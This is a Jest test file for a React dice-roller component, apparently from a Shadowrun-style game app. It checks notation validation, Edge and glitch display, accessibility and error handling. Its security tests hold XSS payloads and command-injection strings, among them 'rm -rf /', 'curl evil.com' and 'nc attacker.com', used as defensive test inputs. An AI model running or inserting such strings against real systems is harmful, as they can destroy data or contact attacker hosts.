/**
 * Tests for DiceRoller component
 * Tests dice input validation, XSS prevention, and edge cases
 */
import React from 'react';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import '@testing-library/jest-dom';
import DiceRoller from '../../components/DiceRoller';

// Mock fetch for API calls
global.fetch = jest.fn();

describe('DiceRoller Component', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    (global.fetch as jest.Mock).mockResolvedValue({
      ok: true,
      json: async () => ({
        result: {
          rolls: [3, 5, 2],
          total: 10,
          notation: '3d6'
        }
      })
    });
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  it('renders dice roller interface', () => {
    render(<DiceRoller />);
    
    expect(screen.getByPlaceholderText(/dice notation/i)).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /roll/i })).toBeInTheDocument();
  });

  it('handles valid dice notation', async () => {
    const user = userEvent.setup();
    render(<DiceRoller />);
    
    const input = screen.getByPlaceholderText(/dice notation/i);
    const rollButton = screen.getByRole('button', { name: /roll/i });
    
    await user.type(input, '3d6');
    await user.click(rollButton);
    
    await waitFor(() => {
      expect(fetch).toHaveBeenCalledWith(
        expect.any(String),
        expect.objectContaining({
          method: 'POST',
          body: expect.stringContaining('3d6')
        })
      );
    });
  });

  describe('Input Validation', () => {
    it('rejects invalid dice notation', async () => {
      const user = userEvent.setup();
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      const invalidNotations = [
        '100d100',  // Too many dice
        'd6',       // Missing count
        '3d',       // Missing size
        'abc',      // Not dice notation
        '',         // Empty
      ];
      
      for (const notation of invalidNotations) {
        await user.clear(input);
        await user.type(input, notation);
        await user.click(rollButton);
        
        // Should show error or not make API call
        await waitFor(() => {
          expect(screen.queryByText(/invalid/i)).toBeInTheDocument();
        });
      }
    });

    it('handles unicode and emoji gracefully', async () => {
      const user = userEvent.setup();
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      const emojiNotations = [
        '10d🔥',
        '5d☠️',
        '🎲d6',
        'Roll 10d🎯'
      ];
      
      for (const notation of emojiNotations) {
        await user.clear(input);
        await user.type(input, notation);
        await user.click(rollButton);
        
        // Should show error message
        await waitFor(() => {
          expect(screen.queryByText(/invalid/i)).toBeInTheDocument();
        });
      }
    });
  });

  describe('XSS Prevention', () => {
    it('sanitizes user input to prevent XSS', async () => {
      const user = userEvent.setup();
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      const dangerousInputs = [
        '<script>alert("xss")</script>3d6',
        '3d6<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
        '<iframe src="evil.com"></iframe>',
        '3d6" onmouseover="alert(1)"'
      ];
      
      for (const dangerous of dangerousInputs) {
        await user.clear(input);
        await user.type(input, dangerous);
        
        // Check that dangerous content is not rendered
        const container = screen.getByPlaceholderText(/dice notation/i).parentElement;
        expect(container?.innerHTML).not.toContain('<script>');
        expect(container?.innerHTML).not.toContain('onerror=');
        expect(container?.innerHTML).not.toContain('javascript:');
        expect(container?.innerHTML).not.toContain('<iframe');
      }
    });

    it('sanitizes API response to prevent XSS', async () => {
      const user = userEvent.setup();
      
      // Mock malicious API response
      (global.fetch as jest.Mock).mockResolvedValueOnce({
        ok: true,
        json: async () => ({
          result: {
            rolls: [3, 5, 2],
            total: 10,
            notation: '<script>alert("xss")</script>3d6'
          }
        })
      });
      
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      await user.type(input, '3d6');
      await user.click(rollButton);
      
      await waitFor(() => {
        // Check that script tags are not rendered
        const resultsContainer = screen.getByTestId('dice-results');
        expect(resultsContainer.innerHTML).not.toContain('<script>');
      });
    });
  });

  describe('Edge Mechanics', () => {
    it('handles Edge dice rolls', async () => {
      const user = userEvent.setup();
      render(<DiceRoller />);
      
      // Look for Edge checkbox/toggle
      const edgeToggle = screen.getByLabelText(/edge/i);
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      await user.click(edgeToggle);
      await user.type(input, '5d6');
      await user.click(rollButton);
      
      await waitFor(() => {
        expect(fetch).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            body: expect.stringContaining('"edge":true')
          })
        );
      });
    });

    it('displays Edge roll results correctly', async () => {
      const user = userEvent.setup();
      
      // Mock Edge roll response
      (global.fetch as jest.Mock).mockResolvedValueOnce({
        ok: true,
        json: async () => ({
          result: {
            rolls: [6, 6, 3, 5, 2, 6, 4],  // Exploded 6s
            hits: 5,
            edge_used: true,
            glitch: false,
            critical_glitch: false
          }
        })
      });
      
      render(<DiceRoller />);
      
      const edgeToggle = screen.getByLabelText(/edge/i);
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      await user.click(edgeToggle);
      await user.type(input, '5d6');
      await user.click(rollButton);
      
      await waitFor(() => {
        expect(screen.getByText(/edge used/i)).toBeInTheDocument();
        expect(screen.getByText(/5 hits/i)).toBeInTheDocument();
      });
    });
  });

  describe('Glitch Detection', () => {
    it('displays glitch warnings', async () => {
      const user = userEvent.setup();
      
      // Mock glitch response
      (global.fetch as jest.Mock).mockResolvedValueOnce({
        ok: true,
        json: async () => ({
          result: {
            rolls: [1, 1, 1, 2, 3],
            hits: 0,
            glitch: true,
            critical_glitch: false
          }
        })
      });
      
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      await user.type(input, '5d6');
      await user.click(rollButton);
      
      await waitFor(() => {
        expect(screen.getByText(/glitch/i)).toBeInTheDocument();
      });
    });

    it('displays critical glitch warnings', async () => {
      const user = userEvent.setup();
      
      // Mock critical glitch response
      (global.fetch as jest.Mock).mockResolvedValueOnce({
        ok: true,
        json: async () => ({
          result: {
            rolls: [1, 1, 1, 1, 1],
            hits: 0,
            glitch: true,
            critical_glitch: true
          }
        })
      });
      
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      await user.type(input, '5d6');
      await user.click(rollButton);
      
      await waitFor(() => {
        expect(screen.getByText(/critical glitch/i)).toBeInTheDocument();
      });
    });
  });

  describe('Accessibility', () => {
    it('has proper ARIA labels', () => {
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      expect(input).toHaveAttribute('aria-label');
      
      const rollButton = screen.getByRole('button', { name: /roll/i });
      expect(rollButton).toHaveAttribute('aria-label');
    });

    it('announces results to screen readers', async () => {
      const user = userEvent.setup();
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      await user.type(input, '3d6');
      await user.click(rollButton);
      
      await waitFor(() => {
        const liveRegion = screen.getByRole('status');
        expect(liveRegion).toHaveAttribute('aria-live', 'polite');
        expect(liveRegion).toHaveTextContent(/rolled/i);
      });
    });
  });

  describe('Error Handling', () => {
    it('displays error message on API failure', async () => {
      const user = userEvent.setup();
      
      (global.fetch as jest.Mock).mockRejectedValueOnce(
        new Error('Network error')
      );
      
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      await user.type(input, '3d6');
      await user.click(rollButton);
      
      await waitFor(() => {
        expect(screen.getByText(/error/i)).toBeInTheDocument();
      });
    });

    it('handles malformed API responses gracefully', async () => {
      const user = userEvent.setup();
      
      (global.fetch as jest.Mock).mockResolvedValueOnce({
        ok: true,
        json: async () => ({ invalid: 'response' })
      });
      
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      await user.type(input, '3d6');
      await user.click(rollButton);
      
      await waitFor(() => {
        expect(screen.getByText(/error/i)).toBeInTheDocument();
      });
    });
  });

  describe('Rapid Clicking Prevention', () => {
    it('prevents multiple simultaneous rolls', async () => {
      const user = userEvent.setup();
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      await user.type(input, '3d6');
      
      // Rapid clicks
      await user.click(rollButton);
      await user.click(rollButton);
      await user.click(rollButton);
      
      // Should only make one API call
      expect(fetch).toHaveBeenCalledTimes(1);
    });
  });

  describe('Command Injection Prevention', () => {
    it('prevents command injection attempts', async () => {
      const user = userEvent.setup();
      render(<DiceRoller />);
      
      const input = screen.getByPlaceholderText(/dice notation/i);
      const rollButton = screen.getByRole('button', { name: /roll/i });
      
      const injectionAttempts = [
        '3d6; rm -rf /',
        '3d6 && curl evil.com',
        '$(malicious_command)',
        '`dangerous_code`',
        '3d6 | nc attacker.com'
      ];
      
      for (const attempt of injectionAttempts) {
        await user.clear(input);
        await user.type(input, attempt);
        await user.click(rollButton);
        
        // Should reject as invalid
        await waitFor(() => {
          expect(screen.queryByText(/invalid/i)).toBeInTheDocument();
        });
      }
    });
  });
}); 